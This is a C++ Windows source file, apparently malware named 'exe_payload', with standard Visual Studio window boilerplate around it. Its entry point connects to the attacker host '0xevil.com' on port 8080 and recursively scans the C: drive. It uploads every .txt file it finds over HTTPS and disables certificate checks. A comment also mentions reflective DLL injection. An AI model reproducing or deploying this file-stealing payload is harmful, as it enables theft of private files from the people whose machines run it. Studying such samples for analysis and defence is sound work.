// exe_payload.cpp : Defines the entry point for the application.
//

#define _CRT_SECURE_NO_WARNINGS
#define CRT_SECURE_NO_WARNINGS

#include "stdafx.h"
#include "exe_payload.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>
#include <process.h> 
#include <io.h>
#include <wininet.h>
#include <tchar.h> 
#include <strsafe.h>
//#include <Winhttp.h>


#pragma warning(disable:4996)
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "iphlpapi.lib")

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

#define DEFAULT_BUFLEN 1024
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000200
#define ERROR_WINHTTP_RESEND_REQUEST 12032
#define ERROR_WINHTTP_SECURE_FAILURE 12175
#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x)) 
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
#define _CRT_SECURE_NO_DEPRECATE
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA_         0x00000100
#define INTERNET_FLAG_PRAGMA_NOCACHE_    0x00000100  // asking wininet to add "pragma: no-cache"

HINSTANCE hAppInstance;
static const char *acceptTypes[] = { "*/*", NULL };
const char *server = "0xevil.com";
short port = 8080;
HINTERNET hSession, hConnect, hFile;
HANDLE leaked_file;
OVERLAPPED ol = { 0 };
DWORD g_BytesTransferred = 0;
DWORD dwFileSize;
char *lpBuffer;
DWORD rec_timeout = 3 * 600;					// override the 30 second timeout
DWORD timeout = 3 * 600; // infinite milliseconds
char headers[256] = { 0 };
//char *pszFilePath = "D:\\test.txt";
char *upload_file;
BYTE            rgbBuf[1024];
DWORD           cbBuf = sizeof(rgbBuf);
DWORD           cbRead = 0;
char recvbuf[DEFAULT_BUFLEN];

VOID CALLBACK FileIOCompletionRoutine(
	__in  DWORD dwErrorCode,
	__in  DWORD dwNumberOfBytesTransfered,
	__in  LPOVERLAPPED lpOverlapped)
{
	printf("Error code:\t%x\n", dwErrorCode);
}


void exfiltrate_connection() {
	if ((hSession = InternetOpenA(
		(LPCSTR)"myapp",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0
	)) == NULL)
	{
		printf("Couldn't start session. Error %ld\n", GetLastError());
		exit(1);
	}
	printf("Session started\n");

	InternetSetOption(hSession, INTERNET_OPTION_RECEIVE_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout
	InternetSetOption(hSession, INTERNET_OPTION_CONNECT_TIMEOUT, (void *)&timeout, sizeof(timeout));
	InternetSetOption(hSession, ERROR_INTERNET_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout
	if ((hConnect = InternetConnectA(
		hSession,
		(LPCSTR)server,
		port,//INTERNET_DEFAULT_HTTP_PORT
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		0,
		0
	)) == NULL)
	{
		printf("Unable to connect to server. Error %ld\n", GetLastError());
		//exit(1);
	}
	printf("Connected to server\n");
	InternetSetOption(hConnect, INTERNET_OPTION_CONNECT_TIMEOUT, (void *)&timeout, sizeof(timeout));
	InternetSetOption(hConnect, ERROR_INTERNET_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout
}

void send_https(char *pszFilePath, char *file_name) {
	upload_file = (char*)malloc(300);
	memset(upload_file, '\x00', 300);
	strcpy(upload_file, "/upload_file=");
	strcat(upload_file, file_name);

	//printf("upload_file = %s", upload_file);
	Sleep(1000);
	// | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
	if ((hFile = HttpOpenRequestA(
		hConnect,
		(LPCSTR)"POST",
		(LPCSTR)upload_file,
		NULL,
		NULL,
		(LPCSTR*)acceptTypes,
		INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA_ | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,
		0
	)) == NULL)
	{
		printf("Unable to open request. Error %ld\n", GetLastError());
		exit(1);
	}
	DWORD dwFlags;
	DWORD dwBuffLen = sizeof(dwFlags);

	if (InternetQueryOption(hFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
	{
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		InternetSetOption(hFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}
	printf("Opening request..Opened\n");
	//| INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
	InternetSetOption(hConnect, INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA_ | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID, NULL, NULL); // for SSL
	InternetSetOption(hFile, INTERNET_OPTION_CONNECT_TIMEOUT, (void *)&timeout, sizeof(timeout));
	InternetSetOption(hFile, ERROR_INTERNET_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout
	InternetSetOption(hFile, INTERNET_OPTION_RECEIVE_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout

	leaked_file = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

	dwFileSize = GetFileSize(leaked_file, NULL);
	lpBuffer = (char*)malloc(dwFileSize);
	memset(lpBuffer, '\x00', dwFileSize);
	sprintf(headers, "Host: %s:%d\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n", server, port, dwFileSize);

	if (FALSE == ReadFileEx(leaked_file, lpBuffer, dwFileSize, &ol, FileIOCompletionRoutine))
		//if (FALSE == ReadFile(leaked_file, lpBuffer, dwFileSize, NULL, NULL))
	{
		printf("ReadFile: Terminal failure: Unable to read from file.\n GetLastError=%08x\n", GetLastError());
		CloseHandle(leaked_file);
		return;
	}

	
	BOOL res = HttpSendRequestA(
		hFile,
		headers,
		strlen(headers),
		(LPCSTR*)lpBuffer,
		dwFileSize
	);

	while (!res)
	{
		printf("Unable to send request. Error %ld\n", GetLastError());
		exfiltrate_connection();
		Sleep(1000);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hFile);
		InternetCloseHandle(hSession);
		InternetCloseHandle(leaked_file);

		res = HttpSendRequestA(
			hFile,
			headers,
			strlen(headers),
			(LPCSTR*)lpBuffer,
			dwFileSize
		);

		//free(lpBuffer);
	}


	// Drain the socket.
	while (InternetReadFile(hFile, rgbBuf, cbBuf, &cbRead))
	{
		if (cbRead == 0)
		{
			break;
		}
	}
	free(lpBuffer);
	InternetSetOption(hFile, INTERNET_OPTION_CONNECT_TIMEOUT, (void *)&timeout, sizeof(timeout));
	InternetSetOption(hFile, ERROR_INTERNET_TIMEOUT, &rec_timeout, sizeof(rec_timeout));// override the default timeout
}

void dirListFiles(char* startDir)
{
	HANDLE hFind;
	WIN32_FIND_DATAA wfd;
	char path[MAX_PATH];
	char file_path[MAX_PATH];

	sprintf(path, "%s\\*", startDir);
	hFind = FindFirstFileA(path, &wfd);

	BOOL cont = TRUE;
	while (cont == TRUE)
	{
		if (hFind == INVALID_HANDLE_VALUE)
		{
			cont = FALSE;
			break;
			printf("%s\n", GetLastError());
			abort();
		}

		if ((strncmp(".", wfd.cFileName, 1) != 0) && (strncmp("..", wfd.cFileName, 2) != 0))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				sprintf(path, "%s\\%s", startDir, wfd.cFileName);
				dirListFiles(path);
			}
			else
			{
				//do your work here -- mildly klugy comparison
				int len = strlen(wfd.cFileName);
				if (len >4)
					if (strncmp(".txt", wfd.cFileName + len - 4, 4) == 0) {
						memset(file_path, '\x00', MAX_PATH);
						printf("startDir = %s\n", startDir);
						strcpy(file_path, startDir);
						strcat(file_path, "\\");
						strcat(file_path, wfd.cFileName);

						send_https(file_path, wfd.cFileName);
					}
			}
		}
		cont = FindNextFileA(hFind, &wfd);
	}
	if (GetLastError() != ERROR_NO_MORE_FILES & cont == TRUE)
	{
		fprintf(stderr, "FindNextFile died for some reason; path = \"%s\"\n", path);
		abort();
	}
	if (FindClose(hFind) == FALSE & cont == TRUE)
	{
		fprintf(stderr, "FindClose failed\n");
		abort();
	}
}

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	char* startDir = (char*)"c:\\";

	exfiltrate_connection();
	dirListFiles(startDir);

	return TRUE;
    
}


ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_EXEPAYLOAD));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_EXEPAYLOAD);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}


BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
